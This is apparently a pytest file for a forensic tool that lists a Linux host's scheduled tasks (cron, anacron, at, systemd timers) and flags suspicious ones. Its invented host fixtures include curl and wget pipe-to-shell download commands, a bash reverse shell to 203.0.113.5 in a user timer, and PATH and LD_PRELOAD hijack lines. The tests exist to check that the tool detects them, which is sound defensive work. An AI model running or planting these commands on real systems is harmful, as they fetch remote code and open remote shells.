"""Everything a Linux host runs on a schedule, one row each (v0.7.168).

Synthetic host; users, paths and addresses are invented.
"""
from __future__ import annotations

import csv
import logging
from pathlib import Path
from types import SimpleNamespace

import pytest

from artifact_engine.handlers import lin_tasks


def _write(base: Path, rel: str, text: str) -> None:
    f = base / rel
    f.parent.mkdir(parents=True, exist_ok=True)
    f.write_text(text, encoding="utf-8")


def _csv(base: Path, rel: str, header: list[str], rows: list[list]) -> None:
    f = base / rel
    f.parent.mkdir(parents=True, exist_ok=True)
    with f.open("w", newline="", encoding="utf-8") as fh:
        w = csv.writer(fh)
        w.writerow(header)
        w.writerows(rows)


@pytest.fixture
def tasks(tmp_path) -> list[dict]:
    ev = tmp_path / "ev"
    r = ev / "[root]"
    _write(r, "etc/passwd", "root:x:0:0:root:/root:/bin/bash\n"
                            "jdoe:x:1000:1000::/home/jdoe:/bin/bash\n")
    _write(r, "etc/crontab",
           "SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n"
           "# minute hour day month weekday user command\n"
           "17 * * * * root cd / && run-parts --report /etc/cron.hourly\n")
    _write(r, "etc/cron.d/sync", "PATH=/tmp/.b:/usr/bin\n@reboot root /usr/local/bin/sync-up\n")
    _write(r, "etc/cron.d/preload", "LD_PRELOAD=/usr/lib/x.so\n")
    _write(r, "var/spool/cron/crontabs/jdoe",
           "MAILTO=jdoe\n*/5 * * * * curl -s http://203.0.113.5/p | sh\n")
    _write(r, "etc/anacrontab", "1 5 cron.daily run-parts --report /etc/cron.daily\n")
    _write(r, "etc/cron.daily/backup", "#!/bin/sh\nrsync -a /srv /backup\n")
    _write(r, "etc/cron.daily/upd", "#!/bin/sh\n# refresh\nwget -q http://203.0.113.5/u -O- | sh\n")
    _write(r, "var/spool/cron/atjobs/a0001501c47b46",
           "#!/bin/sh\numask 22\nSHELL=/bin/sh; export SHELL\ncd /home/jdoe || {\n"
           "\t echo 'Execution directory inaccessible' >&2\n\t exit 1\n}\n/dev/shm/.u/upd\n")
    _write(r, "etc/systemd/system/backup.timer",
           "[Timer]\nOnCalendar=*-*-* 03:00:00\nUnit=backup-run.service\n")
    _write(r, "etc/systemd/system/backup-run.service",
           "[Service]\nUser=jdoe\nExecStart=/usr/local/bin/backup --all\n")
    _write(r, "home/jdoe/.config/systemd/user/beacon.timer", "[Timer]\nOnUnitActiveSec=10min\n")
    _write(r, "home/jdoe/.config/systemd/user/beacon.service",
           "[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/203.0.113.5/443 0>&1'\n")
    _write(r, "etc/cron.allow", "root\n")
    _write(ev, "live_response/system/systemctl_list-timers_--all.txt",
           "NEXT                         LEFT        LAST                         PASSED       UNIT                    ACTIVATES\n"
           "Wed 2026-05-20 03:00:00 CEST 4h left     Tue 2026-05-19 03:00:00 CEST 20h ago      backup.timer            backup-run.service\n"
           "n/a                          n/a         Tue 2026-05-19 09:00:00 CEST 14h ago      ghost.timer             ghost.service\n"
           "\n2 timers listed.\n")
    _csv(ev, "CSVs/Filesystem/bodyfile.csv",
         ["name", "inode", "mode", "uid", "gid", "size", "atime_utc", "mtime_utc",
          "ctime_utc", "crtime_utc"],
         [["/etc/crontab", "1", "r/rrw-r--r--", "0", "0", "9", "", "2026-01-02 10:00:00", "", ""],
          ["/var/spool/cron/crontabs/jdoe", "2", "r/rrw-------", "1000", "0", "9", "",
           "2026-05-18 22:41:07", "", ""],
          ["/var/spool/cron/atjobs/a0001501c47b46", "3", "r/rrwx------", "1000", "0", "9",
           "", "2026-05-19 21:00:00", "", ""],
          ["/usr/bin/curl", "4", "r/rrwxr-xr-x", "0", "0", "9", "", "2025-01-01 00:00:00", "", ""]])
    _csv(ev, "CSVs/EventLogs/cron_log.csv",
         ["timestamp", "time_utc", "kind", "user", "detail", "suspicious"],
         [["", "2026-05-19 10:00:00", "exec", "jdoe", "curl -s http://203.0.113.5/p | sh", ""],
          ["", "2026-05-19 10:05:00", "exec", "jdoe", "curl -s http://203.0.113.5/p | sh", ""],
          ["", "2026-05-19 10:05:00", "reload", "jdoe", "crontabs/jdoe", ""]])
    out = tmp_path / "out"
    lin_tasks.run(SimpleNamespace(evidence=ev, out=out, log=logging.getLogger("t")))
    with open(out / "tasks.csv", encoding="utf-8", newline="") as fh:
        return list(csv.DictReader(fh))


def _one(rows: list[dict], **kv) -> dict:
    got = [r for r in rows if all(r[k] == v for k, v in kv.items())]
    assert len(got) == 1, (kv, got)
    return got[0]


def test_a_system_crontab_line_is_split_into_schedule_user_and_command(tasks):
    r = _one(tasks, mechanism="cron", file="etc/crontab")
    assert (r["schedule"], r["user"], r["command"]) == (
        "17 * * * *", "root", "cd / && run-parts --report /etc/cron.hourly")
    assert r["modified_utc"] == "2026-01-02 10:00:00" and r["suspicious"] == ""
    assert _one(tasks, file="etc/cron.d/sync", mechanism="cron")["schedule"] == "@reboot"


def test_a_spool_line_belongs_to_its_file_and_carries_its_runs(tasks):
    """The user spool names its user by file name, and cron_log says how often
    the line ran -- a line installed last night and run every five minutes since."""
    r = _one(tasks, file="var/spool/cron/crontabs/jdoe", mechanism="cron")
    assert (r["user"], r["schedule"]) == ("jdoe", "*/5 * * * *")
    assert r["command"] == "curl -s http://203.0.113.5/p | sh"
    assert (r["runs"], r["last_run_utc"]) == ("2", "2026-05-19 10:05:00")
    assert r["modified_utc"] == "2026-05-18 22:41:07"
    assert r["suspicious"] == "yes" and "curl" in r["reason"]


def test_environment_lines_are_flagged_only_when_they_redirect_every_job(tasks):
    env = {r["command"]: r["suspicious"] for r in tasks if r["mechanism"] == "cron environment"}
    assert env["SHELL=/bin/sh"] == "" and env["MAILTO=jdoe"] == ""
    assert env["PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin"] == ""
    assert env["PATH=/tmp/.b:/usr/bin"] == "yes"
    assert env["LD_PRELOAD=/usr/lib/x.so"] == "yes"


def test_anacron_and_the_periodic_scripts(tasks):
    a = _one(tasks, mechanism="anacron")
    assert a["schedule"].startswith("every 1 ") and a["command"].startswith("run-parts")
    assert _one(tasks, file="etc/cron.daily/backup")["suspicious"] == ""
    upd = _one(tasks, file="etc/cron.daily/upd")
    assert upd["suspicious"] == "yes" and "wget -q" in upd["reason"]
    assert upd["schedule"] == "daily"


def test_an_at_job_says_when_it_runs_and_what_after_the_preamble(tasks):
    r = _one(tasks, mechanism="at")
    assert r["schedule"] == "once at 2026-05-19 22:30 UTC"
    assert r["command"] == "/dev/shm/.u/upd"
    assert r["user"] == "jdoe"                      # bodyfile uid -> passwd
    assert r["suspicious"] == "yes"


def test_a_timer_carries_the_command_it_starts_and_when_it_ran(tasks):
    r = _one(tasks, file="etc/systemd/system/backup.timer")
    assert r["schedule"] == "OnCalendar=*-*-* 03:00:00"
    assert (r["user"], r["command"]) == ("jdoe", "/usr/local/bin/backup --all")
    assert r["state"] == ("next Wed 2026-05-20 03:00:00 CEST; "
                          "last Tue 2026-05-19 03:00:00 CEST")
    u = _one(tasks, file="home/jdoe/.config/systemd/user/beacon.timer")
    assert u["user"] == "jdoe" and u["suspicious"] == "yes"


def test_a_loaded_timer_with_no_unit_file_is_still_a_row(tasks):
    r = _one(tasks, mechanism="systemd timer", file="")
    assert r["command"] == "(starts ghost.service)"
    assert r["state"].startswith("next n/a; last Tue 2026-05-19 09:00:00 CEST")


def test_flagged_rows_come_first(tasks):
    flags = [r["suspicious"] for r in tasks]
    assert flags == sorted(flags, key=lambda s: s != "yes")
    assert _one(tasks, mechanism="cron access")["file"] == "etc/cron.allow"
